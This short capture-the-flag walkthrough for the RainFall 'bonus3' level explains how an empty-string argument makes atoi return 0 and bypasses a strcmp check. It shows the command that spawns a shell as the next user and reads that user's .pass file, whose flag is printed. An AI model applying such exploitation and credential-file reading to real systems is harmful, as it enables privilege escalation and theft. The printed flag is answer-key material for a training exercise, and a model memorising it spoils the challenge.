 # Walkthrough bonus3

We have a buffer in which we put a '\0' at buffer[atoi(argv[1])].  
So to enter in strcmp we must have a null byte in argv[1] and atoi return 0.  

We have tried with "python -c" to fill argv[1] with null byte. But it's not working.  
So we have used an another strategy: an empty string.  

``` bash
bonus3@RainFall:~$ ./bonus3 ''
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```
